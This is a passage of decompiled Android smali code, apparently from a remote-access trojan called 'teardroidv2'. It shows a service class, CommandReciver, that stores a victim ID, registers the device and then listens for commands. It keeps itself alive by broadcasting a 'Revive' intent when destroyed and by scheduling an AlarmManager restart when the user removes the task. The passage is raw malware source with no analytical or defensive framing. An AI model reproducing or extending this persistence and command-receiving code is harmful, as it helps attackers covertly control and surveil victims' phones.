    check-cast v2, Ljava/lang/CharSequence;

    invoke-virtual {v0, v2}, Landroidx/core/app/NotificationCompat$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v0

    .line 73
    sget-object v2, Lcom/example/teardroidv2/AppInfo;->INSTANCE:Lcom/example/teardroidv2/AppInfo;

    invoke-virtual {v2}, Lcom/example/teardroidv2/AppInfo;->getNotificationContent()Ljava/lang/String;

    move-result-object v2

    check-cast v2, Ljava/lang/CharSequence;

    invoke-virtual {v0, v2}, Landroidx/core/app/NotificationCompat$Builder;->setContentText(Ljava/lang/CharSequence;)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v0

    .line 74
    sget-object v2, Lcom/example/teardroidv2/AppInfo;->INSTANCE:Lcom/example/teardroidv2/AppInfo;

    invoke-virtual {v2}, Lcom/example/teardroidv2/AppInfo;->getNotificationSubText()Ljava/lang/String;

    move-result-object v2

    check-cast v2, Ljava/lang/CharSequence;

    invoke-virtual {v0, v2}, Landroidx/core/app/NotificationCompat$Builder;->setSubText(Ljava/lang/CharSequence;)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v0

    const v2, 0x7f07006d

    .line 75
    invoke-virtual {v0, v2}, Landroidx/core/app/NotificationCompat$Builder;->setSmallIcon(I)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v0

    .line 76
    invoke-virtual {v0, v3}, Landroidx/core/app/NotificationCompat$Builder;->setCategory(Ljava/lang/String;)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v0

    .line 77
    invoke-virtual {v0, p1}, Landroidx/core/app/NotificationCompat$Builder;->setContentIntent(Landroid/app/PendingIntent;)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object p1

    .line 78
    invoke-virtual {p1}, Landroidx/core/app/NotificationCompat$Builder;->build()Landroid/app/Notification;

    move-result-object p1

    const-string v0, "notificationBuilder\n    \u2026ent)\n            .build()"

    invoke-static {p1, v0}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullExpressionValue(Ljava/lang/Object;Ljava/lang/String;)V

    .line 79
    invoke-virtual {v1, v4, p1}, Landroid/app/NotificationManager;->notify(ILandroid/app/Notification;)V

    return-void

    .line 59
    :cond_0
    new-instance p1, Ljava/lang/NullPointerException;

    const-string v0, "null cannot be cast to non-null type android.app.NotificationManager"

    invoke-direct {p1, v0}, Ljava/lang/NullPointerException;-><init>(Ljava/lang/String;)V

    throw p1
.end method

.method private final startNotificationListner()V
    .locals 2

    .line 136
    new-instance v0, Landroid/content/IntentFilter;

    invoke-direct {v0}, Landroid/content/IntentFilter;-><init>()V

    .line 137
    sget-object v1, Lcom/example/teardroidv2/AppInfo;->INSTANCE:Lcom/example/teardroidv2/AppInfo;

    invoke-virtual {v1}, Lcom/example/teardroidv2/AppInfo;->getPackageName()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 138
    iget-object v1, p0, Lcom/example/teardroidv2/CommandReciver;->nReceiver:Lcom/example/teardroidv2/CommandReciver$NotificationReceiver;

    check-cast v1, Landroid/content/BroadcastReceiver;

    invoke-virtual {p0, v1, v0}, Lcom/example/teardroidv2/CommandReciver;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1

    const-string v0, "intent"

    invoke-static {p1, v0}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullParameter(Ljava/lang/Object;Ljava/lang/String;)V

    .line 162
    new-instance p1, Ljava/lang/UnsupportedOperationException;

    const-string v0, "Not yet implemented"

    invoke-direct {p1, v0}, Ljava/lang/UnsupportedOperationException;-><init>(Ljava/lang/String;)V

    throw p1
.end method

.method public onCreate()V
    .locals 5

    .line 23
    iget-object v0, p0, Lcom/example/teardroidv2/CommandReciver;->TAG:Ljava/lang/String;

    const-string v1, "On onCreate called"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 25
    new-instance v0, Landroid/content/Intent;

    move-object v1, p0

    check-cast v1, Landroid/content/Context;

    const-class v2, Lcom/example/teardroidv2/CommandReciver;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v2, 0x4000000

    const/4 v3, 0x0

    .line 26
    invoke-static {v1, v3, v0, v2}, Landroid/app/PendingIntent;->getActivity(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v0

    const-string v2, "Intent(this, CommandReci\u2026_IMMUTABLE)\n            }"

    .line 25
    invoke-static {v0, v2}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullExpressionValue(Ljava/lang/Object;Ljava/lang/String;)V

    .line 29
    sget v2, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v4, 0x1a

    if-lt v2, v4, :cond_0

    .line 30
    invoke-direct {p0, v0}, Lcom/example/teardroidv2/CommandReciver;->startMyOwnForeground(Landroid/app/PendingIntent;)V

    .line 32
    :cond_0
    sget-object v0, LRequest;->Companion:LRequest$Companion;

    invoke-virtual {v0, v1}, LRequest$Companion;->init(Landroid/content/Context;)V

    .line 33
    invoke-direct {p0}, Lcom/example/teardroidv2/CommandReciver;->startNotificationListner()V

    .line 34
    sget-object v0, Lcom/example/teardroidv2/AppInfo;->INSTANCE:Lcom/example/teardroidv2/AppInfo;

    invoke-virtual {v0}, Lcom/example/teardroidv2/AppInfo;->getVictimDatastore()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0, v3}, Lcom/example/teardroidv2/CommandReciver;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    .line 35
    sget-object v1, Lcom/example/teardroidv2/AppInfo;->INSTANCE:Lcom/example/teardroidv2/AppInfo;

    invoke-virtual {v1}, Lcom/example/teardroidv2/AppInfo;->getVictimID()Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x0

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    if-nez v1, :cond_1

    const-string v1, "VictimDataStore"

    .line 36
    invoke-static {v0, v1}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullExpressionValue(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-direct {p0, v0}, Lcom/example/teardroidv2/CommandReciver;->setVictim(Landroid/content/SharedPreferences;)V

    goto :goto_0

    .line 38
    :cond_1
    invoke-direct {p0}, Lcom/example/teardroidv2/CommandReciver;->getVictimID()Ljava/lang/String;

    move-result-object v0

    .line 39
    invoke-direct {p0, v0}, Lcom/example/teardroidv2/CommandReciver;->commandReciver(Ljava/lang/String;)V

    .line 41
    :goto_0
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    return-void
.end method

.method public onDestroy()V
    .locals 2

    .line 166
    iget-object v0, p0, Lcom/example/teardroidv2/CommandReciver;->TAG:Ljava/lang/String;

    const-string v1, "On Destroyed called"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 167
    iget-object v0, p0, Lcom/example/teardroidv2/CommandReciver;->nReceiver:Lcom/example/teardroidv2/CommandReciver$NotificationReceiver;

    check-cast v0, Landroid/content/BroadcastReceiver;

    invoke-virtual {p0, v0}, Lcom/example/teardroidv2/CommandReciver;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    .line 168
    new-instance v0, Landroid/content/Intent;

    invoke-direct {v0}, Landroid/content/Intent;-><init>()V

    const-string v1, "Revive"

    .line 169
    invoke-virtual {v0, v1}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    .line 170
    invoke-virtual {p0, v0}, Lcom/example/teardroidv2/CommandReciver;->sendBroadcast(Landroid/content/Intent;)V

    .line 171
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 0

    const-string p2, "intent"

    invoke-static {p1, p2}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullParameter(Ljava/lang/Object;Ljava/lang/String;)V

    .line 45
    iget-object p1, p0, Lcom/example/teardroidv2/CommandReciver;->TAG:Ljava/lang/String;

    const-string p2, "On onStartCommand called"

    invoke-static {p1, p2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    const/4 p1, 0x1

    return p1
.end method

.method public onTaskRemoved(Landroid/content/Intent;)V
    .locals 6

    .line 176
    sget-object v0, Lcom/example/teardroidv2/AppInfo;->INSTANCE:Lcom/example/teardroidv2/AppInfo;

    invoke-virtual {v0}, Lcom/example/teardroidv2/AppInfo;->getTAG()Ljava/lang/String;

    move-result-object v0

    const-string v1, "Service: onTaskRemoved"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 180
    new-instance v0, Landroid/content/Intent;

    invoke-virtual {p0}, Lcom/example/teardroidv2/CommandReciver;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-virtual {p0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v2

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 181
    invoke-virtual {p0}, Lcom/example/teardroidv2/CommandReciver;->getPackageName()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setPackage(Ljava/lang/String;)Landroid/content/Intent;

    .line 183
    invoke-virtual {p0}, Lcom/example/teardroidv2/CommandReciver;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const/4 v2, 0x1

    const/high16 v3, 0x2000000

    .line 182
    invoke-static {v1, v2, v0, v3}, Landroid/app/PendingIntent;->getService(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v0

    .line 187
    invoke-virtual {p0}, Lcom/example/teardroidv2/CommandReciver;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-string v2, "alarm"

    invoke-virtual {v1, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    if-eqz v1, :cond_0

    check-cast v1, Landroid/app/AlarmManager;

    .line 188
    invoke-static {}, Landroid/os/SystemClock;->elapsedRealtime()J

    move-result-wide v2

    const/16 v4, 0x3e8

    int-to-long v4, v4

    add-long/2addr v2, v4

    const/4 v4, 0x3

    invoke-virtual {v1, v4, v2, v3, v0}, Landroid/app/AlarmManager;->set(IJLandroid/app/PendingIntent;)V

    .line 190
    invoke-super {p0, p1}, Landroid/app/Service;->onTaskRemoved(Landroid/content/Intent;)V

    return-void

    .line 187
    :cond_0
    new-instance p1, Ljava/lang/NullPointerException;

    const-string v0, "null cannot be cast to non-null type android.app.AlarmManager"

    invoke-direct {p1, v0}, Ljava/lang/NullPointerException;-><init>(Ljava/lang/String;)V

    throw p1
.end method
